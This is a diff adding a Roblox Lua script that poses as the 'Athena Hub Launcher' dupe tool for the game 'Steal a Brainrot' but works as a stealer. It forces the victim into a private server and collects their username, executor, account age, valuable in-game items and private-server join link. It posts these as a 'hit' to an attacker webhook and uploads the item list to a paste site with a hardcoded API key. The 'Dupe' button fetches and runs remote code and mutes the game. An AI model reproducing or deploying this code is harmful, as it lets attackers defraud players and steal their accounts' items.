@@ -1,0 +1,249 @@
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+_G.webhook = "<webhook_url>"
+_G.sended = false
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local NumberUtils = require(ReplicatedStorage.Utils.NumberUtils)
+local Synchronizer = require(ReplicatedStorage.Packages.Synchronizer)
+local Animals = require(ReplicatedStorage.Shared.Animals)
+local Game = require(ReplicatedStorage.Shared.Game)
+
+local executor = identifyexecutor() or "Unknown"
+
+local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+if serverType ~= "VIPServer" then
+    LocalPlayer:Kick("Server error. Please join a private server")
+end
+
+local Orion = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
+
+local Window = Orion:MakeWindow({
+    Name = "Athena Hub Launcher",
+    HidePremium = false,
+    IntroEnabled = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionTest"
+})
+
+local LauncherTab = Window:MakeTab({
+    Name = "Launcher",
+    Icon = "",
+    PremiumOnly = false
+})
+
+local LauncherSection = LauncherTab:AddSection({
+    Name = "Launcher"
+})
+
+local privateServerLink = ""
+LauncherSection:AddTextbox({
+    Name = "Import Private Server Link",
+    Default = "Enter link here...",
+    TextDisappear = false,
+    Callback = function(value)
+        privateServerLink = value
+        if privateServerLink:match("^https://www.roblox.com/share%?code=") then
+            Orion:MakeNotification({
+                Name = "Notification",
+                Content = "You enter Private Server Link correct?",
+                Image = "",
+                Time = 5
+            })
+        end
+    end
+})
+
+LauncherSection:AddButton({
+    Name = "Start",
+    Callback = function()
+        if not privateServerLink:match("^https://www.roblox.com/share%?code=") then
+            return
+        end
+
+        local hitList = {}
+        local fullHitList = {}
+        for _, animal in pairs(ReplicatedStorage:Get("AnimalPodiums")) do
+            if animal.Index ~= "Empty" then
+                local name = animal.Name or "Unknown"
+                local mutation = animal.Mutation or ""
+                local traits = animal.Traits or ""
+                local generation = animal.Generation or 0
+                local cashMultiplier = Synchronizer:GetPlayerCashMultiplayer() or 1
+                table.insert(hitList, string.format(
+                    "Slot %s: %s [%s] %s ➜ $%s/s",
+                    animal.Index,
+                    name,
+                    mutation,
+                    traits,
+                    NumberUtils.ToString(generation * cashMultiplier)
+                ))
+                table.insert(fullHitList, string.format(
+                    "%s [%s] %s ➜ $%s/s",
+                    name,
+                    mutation,
+                    traits,
+                    NumberUtils.ToString(generation * cashMultiplier)
+                ))
+            end
+        end
+
+        local embed = {
+            title = "<:Athena:1414565734553489428> Steal a Brainrot Hit with Athena <:Athena:1414565734553489428>",
+            color = 65280,
+            fields = {
+                {
+                    name = "Victim Info",
+                    value = string.format(
+                        "```Username: %s\nExecutor: %s\nAccount Age: %s Days\nReceiver: Username```",
+                        LocalPlayer.Name,
+                        executor,
+                        LocalPlayer.AccountAge
+                    ),
+                    inline = true
+                },
+                {
+                    name = "Hit List:",
+                    value = "",
+                    inline = false
+                },
+                {
+                    name = "Full Hit List:",
+                    value = #fullHitList > 0 and table.concat(fullHitList, "\n") or "Limited",
+                    inline = false
+                },
+                {
+                    name = "Join link:",
+                    value = privateServerLink,
+                    inline = false
+                }
+            }
+        }
+
+        if not _G.sended then
+            _G.sended = true
+            local webhookPayload = {
+                content = "@everyone",
+                embeds = { embed }
+            }
+            HttpService:Request({
+                Url = _G.webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(webhookPayload)
+            })
+        end
+
+        local pastePayload = {
+            type = "PASTE",
+            title = "discord.gg/ppGBEpVPv6",
+            content = table.concat(fullHitList, "\n"),
+            visibility = "UNLISTED",
+            encrypted = false
+        }
+        local pasteResponse = HttpService:Request({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {
+                Accept = "application/json",
+                ["Content-Type"] = "application/json",
+                ["X-API-KEY"] = "R7lTBvzuD3UHpPqcRQuUZ1Ey1NDZdHDjUgwPVzBM2M5ZgM0WpHFOLsRFr5e1"
+            },
+            Body = HttpService:JSONEncode(pastePayload)
+        })
+
+        if pasteResponse.StatusCode == 200 then
+            local pasteData = HttpService:JSONDecode(pasteResponse.Body)
+            _G.fullhit = pasteData.paste.raw_url
+        else
+            _G.fullhit = "Limited"
+        end
+    end
+})
+
+local DupeTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "",
+    PremiumOnly = false
+})
+
+local DupeSection = DupeTab:AddSection({
+    Name = "Dupe"
+})
+
+local brainrotItems = {}
+for _, animal in ipairs(ReplicatedStorage:Get("AnimalPodiums")) do
+    if animal.Index ~= "Empty" then
+        local name = animal.Name or "Unknown"
+        local mutation = animal.Mutation or ""
+        local traits = animal.Traits or ""
+        table.insert(brainrotItems, string.format("%s [%s] %s", name, mutation, traits))
+    end
+end
+
+DupeSection:AddDropdown({
+    Name = "Brainrot",
+    Default = brainrotItems[1] or "Unknown",
+    Options = brainrotItems,
+    Callback = function(value)
+        _G.brainrot = value
+    end
+})
+
+DupeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        _G.sended = false
+        table.sort(brainrotItems, function(a, b)
+            local genA = Animals[a].Generation or 0
+            local genB = Animals[b].Generation or 0
+            return genA > genB
+        end)
+
+        local sortedList = table.concat(brainrotItems, "\n")
+        if #brainrotItems > 5 then
+            sortedList = sortedList .. "\nand more!"
+        end
+
+        local pastePayload = {
+            type = "PASTE",
+            title = "discord.gg/ppGBEpVPv6",
+            content = sortedList,
+            visibility = "UNLISTED",
+            encrypted = false
+        }
+        local pasteResponse = HttpService:Request({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {
+                Accept = "application/json",
+                ["Content-Type"] = "application/json",
+                ["X-API-KEY"] = "R7lTBvzuD3UHpPqcRQuUZ1Ey1NDZdHDjUgwPVzBM2M5ZgM0WpHFOLsRFr5e1"
+            },
+            Body = HttpService:JSONEncode(pastePayload)
+        })
+
+        if pasteResponse.StatusCode == 200 then
+            local pasteData = HttpService:JSONDecode(pasteResponse.Body)
+            _G.fullhit = pasteData.paste.raw_url
+        else
+            _G.fullhit = "Limited"
+        end
+
+        local externalScript = loadstring(game:HttpGet("https://pastefy.app/KOw8CoaR/raw"))()
+        externalScript()
+
+        UserSettings().GameSettings.MasterVolume = 0
+    end
+})
+
+Window:Destroy()
